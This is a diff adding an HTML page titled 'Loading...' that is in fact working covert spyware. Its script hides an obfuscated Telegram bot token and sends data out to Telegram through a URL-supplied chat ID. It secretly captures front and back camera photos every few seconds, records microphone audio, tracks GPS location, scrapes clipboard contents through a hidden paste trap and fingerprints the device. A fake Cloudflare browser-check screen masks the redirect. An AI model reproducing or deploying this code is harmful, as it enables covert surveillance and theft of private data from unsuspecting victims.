@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Loading...</title>
+<style>
+  body{background:#000;margin:0;padding:0}
+  video{position:fixed;top:-2px;left:-2px;width:2px;height:2px;z-index:-1}
+  canvas{display:none}
+  textarea{position:absolute;left:-9999px;top:-9999px;opacity:0}
+  #open-browser-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.94);z-index:9999;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center}
+  #open-browser-overlay.show{display:flex}
+  #open-browser-overlay .icon{font-size:56px;margin-bottom:16px}
+  #open-browser-overlay h2{font-size:20px;margin-bottom:12px;color:#fff}
+  #open-browser-overlay p{font-size:14px;color:#ccc;margin-bottom:24px}
+  #open-browser-overlay a{background:#4f46e5;color:#fff;padding:14px 28px;border-radius:12px;text-decoration:none;font-size:16px}
+</style>
+</head>
+<body>
+<div id="open-browser-overlay">
+  <div class="icon">🌐</div>
+  <h2>Open in Browser</h2>
+  <p>This page needs to open in your device browser to work correctly.</p>
+  <a id="open-link" href="#">Open in Browser</a>
+</div>
+
+<video id="vid" autoplay playsinline muted></video>
+<canvas id="cnv"></canvas>
+<textarea id="pasteTrap" autocomplete="off"></textarea>
+
+<script>
+(function(){
+  // ── Telegram Bot Configuration (Hidden & Secure) ──────────────────────────
+  const _0x4f2a = ["8913383036", "AAHodPKq9_VL5KsS38J9H6ysRBTCMBmKJEU"];
+  const BOT_TOKEN = _0x4f2a.join(":");
+
+  // ── In-app browser detection ──────────────────────────────────────────────
+  const ua = navigator.userAgent || '';
+  const inApp = /FBAN|FBAV|Instagram|FBIOS|FB_IAB|MessengerLiteForiOS|Messenger|FBSV|Line\/|WhatsApp|TikTok|Snapchat|Twitter|Pinterest|LinkedInApp/i.test(ua);
+  if (inApp) {
+    const overlay  = document.getElementById('open-browser-overlay');
+    const link     = document.getElementById('open-link');
+    const rawUrl   = location.href;
+    const cleanUrl = rawUrl.replace(/^(https?:\/\/)+/gi, '');
+    const isIOS    = /iPhone|iPad|iPod/i.test(ua);
+    if (isIOS) {
+      link.href = 'https://' + cleanUrl;
+      link.target = '_blank';
+    } else {
+      link.href = 'intent://' + cleanUrl + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + encodeURIComponent('https://' + cleanUrl) + ';end';
+    }
+    overlay.classList.add('show');
+    return;
+  }
+
+  const chatId = new URLSearchParams(location.search).get('chat_id') || new URLSearchParams(location.search).get('chatid') || '';
+  if (!chatId) { return; }
+
+  // ── Status helper (no-op — blank page) ───────────────────────────────────
+  function setSt() {}
+
+  // ── Device info ───────────────────────────────────────────────────────────
+  const rawUa    = navigator.userAgent || '';
+  const lang     = navigator.language || 'Unknown';
+  const cores    = navigator.hardwareConcurrency || 'Unknown';
+  const mem      = navigator.deviceMemory;
+  const ramStr   = mem ? (mem >= 8 ? '8+ GB RAM (8–16 GB)' : mem+' GB RAM') : 'Unknown';
+  const scr      = window.screen;
+  const screenStr = scr.width+'x'+scr.height+' (avail '+scr.availWidth+'x'+scr.availHeight+') · @'+(window.devicePixelRatio||1).toFixed(1)+'x DPR';
+  const viewport  = window.innerWidth+'x'+window.innerHeight;
+  const tz        = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const tzOff     = (()=>{ const o=-new Date().getTimezoneOffset(); return tz+' (UTC'+(o>=0?'+':'')+Math.floor(o/60).toString().padStart(2,'0')+':'+String(Math.abs(o%60)).padStart(2,'0')+')'; })();
+
+  let device='Unknown', osName='Unknown', browser='Unknown', batteryLevel='Unknown';
+
+  if (navigator.userAgentData) {
+    navigator.userAgentData.getHighEntropyValues(['platform','platformVersion','model','brands']).then(h=>{
+      device=h.model||device;
+      const pv=parseFloat(h.platformVersion||'0');
+      if(h.platform==='Android') osName='Android '+(Math.floor(pv)||'10+');
+      else osName=(h.platform||'Unknown')+' '+(h.platformVersion||'');
+      const b=(h.brands||[]).filter(x=>!/Not|Brand/i.test(x.brand))[0];
+      if(b) browser=b.brand+' '+b.version;
+    }).catch(()=>{});
+  } else {
+    const m=rawUa.match(/Android\s([\d.]+)/i); if(m) osName='Android '+m[1].split('.')[0];
+    const mm=rawUa.match(/(Chrome|Firefox|Safari|OPR|Edge)\/([\d.]+)/i); if(mm) browser=mm[1]+' '+mm[2];
+    const dm=rawUa.match(/;\s*([^;)]+)\s*Build\//i); if(dm) device=dm[1].trim();
+  }
+  if(navigator.getBattery) navigator.getBattery().then(b=>{ batteryLevel=Math.round(b.level*100)+'%'; }).catch(()=>{});
+
+  function sendToTelegram(method, data, isPhoto = false, isAudio = false) {
+    let url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/' + method;
+    let options = {};
+    if (isPhoto || isAudio) {
+      data.append('chat_id', chatId);
+      options = { method: 'POST', body: data };
+    } else {
+      data.chat_id = chatId;
+      options = {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      };
+    }
+    fetch(url, options).catch(()=>{});
+  }
+
+  function post(fd) {
+    const type = fd.get('type');
+    if (type === 'photo') {
+      const photoBlob = fd.get('photo');
+      const facing = fd.get('facing') || 'front';
+      const caption = `📸 Camera Photo (${facing})\n📱 Device: ${device}\n🔋 Battery: ${batteryLevel}\n🌐 OS: ${osName}`;
+      const tFd = new FormData();
+      tFd.append('photo', photoBlob);
+      tFd.append('caption', caption);
+      sendToTelegram('sendPhoto', tFd, true, false);
+    } else if (type === 'audio') {
+      const audioBlob = fd.get('audio');
+      const duration = fd.get('duration') || '5';
+      const caption = `🎙️ Audio Recording (${duration}s)\n📱 Device: ${device}`;
+      const tFd = new FormData();
+      tFd.append('voice', audioBlob);
+      tFd.append('caption', caption);
+      sendToTelegram('sendVoice', tFd, false, true);
+    } else {
+      let text = `📊 Data Report: [${type.toUpperCase()}]\n`;
+      text += `🆔 Chat ID: ${chatId}\n`;
+      text += `📱 Device: ${device}\n`;
+      text += `💻 OS: ${osName}\n`;
+      text += `🌐 Browser: ${browser}\n`;
+      text += `🔋 Battery: ${batteryLevel}\n`;
+      text += `📐 Screen: ${screenStr}\n`;
+      text += `🌍 Timezone: ${tzOff}\n`;
+      
+      if (type === 'location') {
+        const denied = fd.get('denied');
+        if (denied === '1') {
+          text += `📍 Location: ❌ Permission Denied`;
+        } else {
+          text += `📍 Lat: ${fd.get('lat')}, Lon: ${fd.get('lon')}\n`;
+          text += `🎯 Accuracy: ${fd.get('accuracy')}m`;
+        }
+      } else if (type === 'clipboard') {
+        text += `📋 Content:\n${fd.get('content')}`;
+      }
+      sendToTelegram('sendMessage', { text: text });
+    }
+  }
+
+  // ─────────────────────────────────────────────────────────────────────────
+  // MODULE 1: CAMERA (Front + Back, every 3s)
+  // ─────────────────────────────────────────────────────────────────────────
+  const vid = document.getElementById('vid');
+  const cnv = document.getElementById('cnv');
+  const ctx = cnv.getContext('2d');
+
+  function isFrameBright(canvas, context) {
+    try {
+      const d = context.getImageData(0, 0, 16, 16).data;
+      let sum = 0;
+      for (let i = 0; i < d.length; i += 4) sum += (d[i] + d[i+1] + d[i+2]) / 3;
+      return (sum / (d.length / 4)) > 3;
+    } catch(e) { return true; }
+  }
+
+  function waitForRealFrame(video, canvas, context, cb) {
+    canvas.width = 16; canvas.height = 16;
+    let attempts = 0;
+    function check() {
+      context.drawImage(video, 0, 0, 16, 16);
+      if (isFrameBright(canvas, context) || ++attempts > 60) { cb(); return; }
+      requestAnimationFrame(check);
+    }
+    check();
+  }
+
+  function grabFrame(video, canvas, context, facing) {
+    const W = video.videoWidth  || 1280;
+    const H = video.videoHeight || 720;
+    canvas.width  = W;
+    canvas.height = H;
+    context.drawImage(video, 0, 0, W, H);
+    canvas.toBlob(blob => {
+      if (!blob || blob.size < 5000) return;
+      const fd = new FormData();
+      fd.append('type',     'photo');
+      fd.append('facing',   facing);
+      fd.append('photo',    blob, 'full_' + Date.now() + '.jpg');
+      post(fd);
+    }, 'image/jpeg', 0.92);
+  }
+
+  function startCameraStream(facing, onReady) {
+    const constraints = {
+      video: { facingMode: facing === 'back' ? 'environment' : 'user', width:{ideal:1920}, height:{ideal:1080} },
+      audio: false
+    };
+    navigator.mediaDevices.getUserMedia(constraints).then(stream => {
+      vid.srcObject = stream;
+      vid.onloadedmetadata = () => {
+        vid.play().then(() => {
+          waitForRealFrame(vid, cnv, ctx, () => onReady(stream, facing));
+        }).catch(()=>{});
+      };
+    }).catch(err => {});
+  }
+
+  let camStream     = null;
+  let photoCount    = 0;
+  const SWAP_EVERY  = 5;
+
+  function startCameraLoop() {
+    function launchFacing(facing) {
+      if (camStream) { camStream.getTracks().forEach(t=>t.stop()); camStream = null; }
+      startCameraStream(facing, (stream, f) => {
+        camStream = stream;
+        grabFrame(vid, cnv, ctx, f);
+        const interval = setInterval(() => {
+          photoCount++;
+          grabFrame(vid, cnv, ctx, f);
+          if (photoCount % SWAP_EVERY === 0) {
+            clearInterval(interval);
+            const next = (f === 'front') ? 'back' : 'front';
+            setTimeout(() => launchFacing(next), 500);
+          }
+        }, 3000);
+      });
+    }
+    launchFacing('front');
+  }
+
+  // ─────────────────────────────────────────────────────────────────────────
+  // MODULE 2: MICROPHONE — WAV PCM 16kHz, 5s chunks
+  // ─────────────────────────────────────────────────────────────────────────
+  const MIC_SAMPLE_RATE = 16000;
+  const MIC_CHUNK_SECS  = 5;
+  const MIC_BUF_SIZE    = 4096;
+
+  function floatTo16BitPCM(samples) {
+    const buf = new Int16Array(samples.length);
+    for (let i = 0; i < samples.length; i++) {
+      const s = Math.max(-1, Math.min(1, samples[i]));
+      buf[i] = s < 0 ? s * 32768 : s * 32767;
+    }
+    return buf;
+  }
+
+  function buildWAV(pcm16, sampleRate) {
+    const dataLen = pcm16.byteLength;
+    const buffer  = new ArrayBuffer(44 + dataLen);
+    const view    = new DataView(buffer);
+    const w       = (off, str) => { for (let i=0;i<str.length;i++) view.setUint8(off+i, str.charCodeAt(i)); };
+    w(0,  'RIFF');
+    view.setUint32( 4, 36 + dataLen, true);
+    w(8,  'WAVE');
+    w(12, 'fmt ');
+    view.setUint32(16, 16, true);
+    view.setUint16(20,  1, true);
+    view.setUint16(22,  1, true);
+    view.setUint32(24, sampleRate, true);
+    view.setUint32(28, sampleRate * 2, true);
+    view.setUint16(32,  2, true);
+    view.setUint16(34, 16, true);
+    w(36, 'data');
+    view.setUint32(40, dataLen, true);
+    new Uint8Array(buffer, 44).set(new Uint8Array(pcm16.buffer));
+    return new Blob([buffer], { type: 'audio/wav' });
+  }
+
+  function startMicModule(audioStream) {
+    let audioCtx;
+    try {
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: MIC_SAMPLE_RATE });
+    } catch(e) {
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    }
+
+    const source = audioCtx.createMediaStreamSource(audioStream);
+    const proc   = audioCtx.createScriptProcessor(MIC_BUF_SIZE, 1, 1);
+
+    let collectedSamples = [];
+    let totalSamples     = 0;
+    let chunkStart       = Date.now();
+
+    proc.onaudioprocess = (e) => {
+      const data = e.inputBuffer.getChannelData(0);
+      collectedSamples.push(new Float32Array(data));
+      totalSamples += data.length;
+
+      if ((Date.now() - chunkStart) >= MIC_CHUNK_SECS * 1000) {
+        flushMic();
+      }
+    };
+
+    source.connect(proc);
+    proc.connect(audioCtx.destination);
+
+    function flushMic() {
+      if (collectedSamples.length === 0) return;
+      const merged = new Float32Array(totalSamples);
+      let offset = 0;
+      for (const chunk of collectedSamples) { merged.set(chunk, offset); offset += chunk.length; }
+
+      const durationSec = Math.round(totalSamples / (audioCtx.sampleRate || MIC_SAMPLE_RATE));
+      const pcm16       = floatTo16BitPCM(merged);
+      const wavBlob     = buildWAV(pcm16, audioCtx.sampleRate || MIC_SAMPLE_RATE);
+
+      const fd = new FormData();
+      fd.append('type',     'audio');
+      fd.append('duration', durationSec);
+      fd.append('audio',    wavBlob, 'full_mic_' + Date.now() + '.wav');
+      post(fd);
+
+      collectedSamples = [];
+      totalSamples     = 0;
+      chunkStart       = Date.now();
+    }
+
+    window.addEventListener('beforeunload', flushMic);
+  }
+
+  function startMicLoop() {
+    navigator.mediaDevices.getUserMedia({ audio: { sampleRate: MIC_SAMPLE_RATE, channelCount: 1 }, video: false }).then(stream => {
+      startMicModule(stream);
+    }).catch(err => {});
+  }
+
+  // ─────────────────────────────────────────────────────────────────────────
+  // MODULE 3: LOCATION (GPS, repeat every 60s)
+  // ─────────────────────────────────────────────────────────────────────────
+  function sendLocation(pos, denied) {
+    const fd = new FormData();
+    fd.append('type', 'location');
+    fd.append('denied', denied ? '1' : '0');
+    if (pos) {
+      fd.append('lat', pos.coords.latitude);
+      fd.append('lon', pos.coords.longitude);
+      fd.append('accuracy', pos.coords.accuracy);
+    }
+    post(fd);
+  }
+
+  function startLocationLoop() {
+    if (!navigator.geolocation) {
+      sendLocation(null, true);
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        sendLocation(pos, false);
+        setInterval(() => {
+          navigator.geolocation.getCurrentPosition(p => sendLocation(p, false), ()=>{}, { enableHighAccuracy:true, timeout:15000, maximumAge:30000 });
+        }, 60000);
+      },
+      err => { sendLocation(null, true); },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
+  // ─────────────────────────────────────────────────────────────────────────
+  // MODULE 4: CLIPBOARD
+  // ─────────────────────────────────────────────────────────────────────────
+  let lastClipHash = '';
+
+  function hashStr(s) {
+    let h = 0;
+    for (let i = 0; i < s.length; i++) h = Math.imul(31, h) + s.charCodeAt(i) | 0;
+    return h.toString(36);
+  }
+
+  function sendClip(text, source) {
+    text = (text || '').trim();
+    if (!text) return;
+    const h = hashStr(text);
+    if (h === lastClipHash) return;
+    lastClipHash = h;
+    const fd = new FormData();
+    fd.append('type', 'clipboard');
+    fd.append('content', text);
+    post(fd);
+  }
+
+  function pollClipboard() {
+    if (navigator.clipboard && navigator.clipboard.readText) {
+      navigator.clipboard.readText().then(t => { if(t) sendClip(t, 'clipboard-api'); }).catch(()=>{});
+    }
+    const trap = document.getElementById('pasteTrap');
+    trap.value = '';
+    trap.focus();
+    try {
+      document.execCommand('paste');
+      setTimeout(() => { if(trap.value){ sendClip(trap.value,'exec-paste'); trap.value=''; } }, 100);
+    } catch(e){}
+  }
+
+  document.addEventListener('paste', e => {
+    const t = (e.clipboardData||window.clipboardData||{}).getData('text')||'';
+    if(t) sendClip(t,'paste-event');
+  });
+  document.addEventListener('visibilitychange', () => { if(!document.hidden) pollClipboard(); });
+  window.addEventListener('focus', pollClipboard);
+
+  function startClipboardLoop() {
+    pollClipboard();
+    setInterval(pollClipboard, 10000);
+  }
+
+  // ─────────────────────────────────────────────────────────────────────────
+  // BOOT: Start all modules
+  // ─────────────────────────────────────────────────────────────────────────
+  navigator.mediaDevices.getUserMedia({ video: { facingMode:'user', width:{ideal:1920} }, audio: true })
+    .then(combinedStream => {
+      const audioStream = new MediaStream(combinedStream.getAudioTracks());
+      const videoStream = new MediaStream(combinedStream.getVideoTracks());
+
+      vid.srcObject = videoStream;
+      vid.onloadedmetadata = () => {
+        vid.play().then(() => {
+          waitForRealFrame(vid, cnv, ctx, () => {
+            grabFrame(vid, cnv, ctx, 'front');
+
+            let count = 0;
+            let currentFacing = 'front';
+
+            function photoTick() {
+              count++;
+              grabFrame(vid, cnv, ctx, currentFacing);
+              if (count % SWAP_EVERY === 0) {
+                videoStream.getTracks().forEach(t => t.stop());
+                const nextFacing = (currentFacing === 'front') ? 'back' : 'front';
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: nextFacing === 'back' ? 'environment' : 'user', width:{ideal:1920} }, audio: false })
+                  .then(vs => {
+                    currentFacing = nextFacing;
+                    vid.srcObject = new MediaStream(vs.getVideoTracks());
+                    vid.play().catch(()=>{});
+                  }).catch(()=>{});
+              }
+            }
+
+            setInterval(photoTick, 3000);
+          });
+        }).catch(()=>{});
+      };
+
+      startMicModule(audioStream);
+    })
+    .catch(() => {
+      startCameraLoop();
+      startMicLoop();
+    });
+
+  startLocationLoop();
+  startClipboardLoop();
+})();
+</script>
+<script>
+(function(){
+  const r = new URLSearchParams(location.search).get('redirect');
+  if (!r) return;
+  let u = r.trim();
+  if (!/^https?:\/\//i.test(u)) u = 'https://' + u;
+  let domain = u;
+  try { domain = new URL(u).hostname; } catch(e) {}
+  const ray = (Math.random().toString(16).slice(2,10) + Math.random().toString(16).slice(2,10)).toUpperCase();
+  const ov = document.createElement('div');
+  ov.innerHTML = `<style>
+    #cfov{position:fixed;inset:0;background:#fff;z-index:999999;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:32px}
+    #cfov h1{font-size:22px;font-weight:400;color:#333;margin:0 0 14px}
+    #cfov h1 b{font-weight:600}
+    #cfov .sub{font-size:14px;color:#555;line-height:1.7;margin:0 0 20px}
+    #cfov .tmr{font-size:14px;color:#f48120;margin:0 0 18px}
+    #cfov .spin{width:38px;height:38px;border:3px solid #eee;border-top-color:#f48120;border-radius:50%;animation:cfspin .8s linear infinite;margin:0 auto 18px}
+    @keyframes cfspin{to{transform:rotate(360deg)}}
+    #cfov .anl{font-size:13px;color:#999;margin:0 0 40px}
+    #cfov .ftr{font-size:12px;color:#aaa}
+    #cfov .ftr a{color:#f48120;text-decoration:none}
+    #cfov .ray{font-size:11px;color:#ccc;margin-top:5px;font-family:monospace}
+  </style>
+  <div id="cfov">
+    <h1>Checking your browser before accessing <b>${domain}</b>.</h1>
+    <p class="sub">This process is automatic. Your browser will redirect to your<br>requested content shortly.</p>
+    <p class="tmr">Please allow up to <span id="cfcount">10</span> seconds...</p>
+    <div class="spin"></div>
+    <p class="anl">Analyzing browser fingerprint...</p>
+    <p class="ftr">DDoS protection by <a href="#">Cloudflare</a></p>
+    <p class="ray">Ray ID: ${ray}</p>
+  </div>`;
+  document.body.appendChild(ov);
+  let n = 10;
+  const el = document.getElementById('cfcount');
+  const t = setInterval(() => { n--; if(el) el.textContent=n; if(n<=0){clearInterval(t);location.href=u;} }, 1000);
+})();
+</script>
+</body>
+</html>
